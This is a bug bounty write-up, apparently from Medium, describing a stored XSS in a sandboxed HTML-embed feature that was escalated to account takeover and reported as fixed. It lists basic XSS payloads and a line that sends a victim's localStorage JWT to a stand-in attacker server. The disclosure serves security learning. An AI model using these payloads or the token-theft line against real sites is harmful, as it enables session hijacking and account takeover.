# :globe_with_meridians: Interesting Stored Xss In Sandboxed Environment To Full Account Takeover 32E5410

---

This is my new writeup related to interesting Stored Cross Scripting where i was able to bypass sandbox restriction additionally i was able to bypass httponly enabled restriction.

Lets get started,

*Little About Sandboxing??*

Sandboxing is a technique in which you create an isolated test environment, a “sandbox,” in which to execute or “detonate” a suspicious file or URL that is attached to an email or otherwise reaches your network and then observe what happens. If the file or URL displays malicious behavior, then you’ve discovered a new threat. The sandbox must be a secure, virtual environment that accurately emulates the CPU of your production servers.

*reference: *[https://buildyourfuture.withgoogle.com/programs/google-sandbox](https://buildyourfuture.withgoogle.com/programs/google-sandbox)

let us consider the target be target.com

Found a Embed HTML feature

*embed feature*

as you can see there are two features Embed URL and Embed HTML ,

First i tried using URL embed so i used ngrok to serve some payloads i tried for SSRF too like try for fetching internal server meta data like ec2,localhost in this case,but i didn’t succeeded for the ssrf so i moved on to xss.

i tried for lots of paylods like svg,xml,js etc.but got hit for just html and just got iframe injection which was not able to access target DOM .

you can see in below screenhost document.domain showing ngrok link not he target means the payload runs in context to ngrok not the target.

now i tried to embed simple payloads like

<script>alert(1)</script>,<script>confirm(1)</script>,print(1),prompt(1)

<img src=x onerror=prompt(1)> etc….

but the application refuses to run the payload due to the sandboxing.

you can see above screenshot showing sandbox blocking the payloads.

## Get Anurag__Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Now ,no issue if alert(),confirm(),print(),prompt() are blocked our aim is to access victim DOM ,then i tried to simply access the DOM elements using payloads like console.log(document.cookie) and it worked .

*document.cookie working successfully*

I quickly reported the issue to the team and they triaged the issue

But wait,there is some twist the main cookies (the sensitive one) in this case were JWT tokens are httponly set to true,means the cookies i was getting are just meta or non sensitive cookie.

*sensitive cookies set to httponly true*

and therefore the company gives p4 priority to the issue which means it still considered a low issue.

*low issue*

I took some time to chain it to full account takeover and finally i found additional flaw in the application i noticed the same sensitive token were stored in the localStorage as id_token parameter.

*sensitive token stored in localStorage*

I confirmed using burpcollaborator and tried to hijack the localstorage sensitive token and it worked successfully.

using payload like:

```
document.location="https://attacker-server?victim_jwt_token"+document.localStorage.getItem("id_token")
```

document.location=”https://attacker-server?victim_jwt_token”+document.localStorage.getItem(“id_token”)

Then i confirmed account takeover and quickly added to comments in previous report and company confirm the reproduce the issue and team quickly updates the issue and increase the severity to p2.

The Issue is resolved now ✅

I have upload video poc for the same on my channel so you can checkout the channel as well.

For other Interesting courses(Web/API/Android) checkout website link:[https://courses.tmgsec.com/courses](https://courses.tmgsec.com/courses)

For further queries you can reach out at: support@tmgsec.com

Hope you like the content ,thanks for reading.

suggestions are welcome.

Connect me

Youtube channel:[redirect _poc](https://www.youtube.com/channel/UCq7-Qf45etdk0qc35I_n7PQ?sub_confirmation=1)

Linkedin: [my_linkedin](http://linkedin.com/in/anurag-verma-650b771a2)

Instagram : varmaanu001

buy me a coffee 😍: [here](https://www.buymeacoffee.com/redirectpoc)

---
